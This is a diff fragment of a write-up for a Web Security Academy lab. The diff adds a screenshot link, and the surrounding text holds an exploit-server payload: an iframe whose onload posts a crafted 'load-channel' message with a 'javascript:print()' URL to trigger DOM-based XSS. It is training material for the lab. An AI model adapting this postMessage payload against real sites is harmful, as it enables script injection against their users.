@@ -2,6 +2,8 @@
 
 ![image](https://user-images.githubusercontent.com/60841283/153748114-09006135-d5fa-4fd7-9723-db0195328481.png)
 
+![image](https://user-images.githubusercontent.com/60841283/153748191-0ff7f8cf-780a-4e25-9f3a-8647e086849b.png)
+
 Payload in exploit server (in Body section) :- 
 ```html
 <iframe src="https://aced1f861f364f39c07a349c00ab0011.web-security-academy.net/#" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>
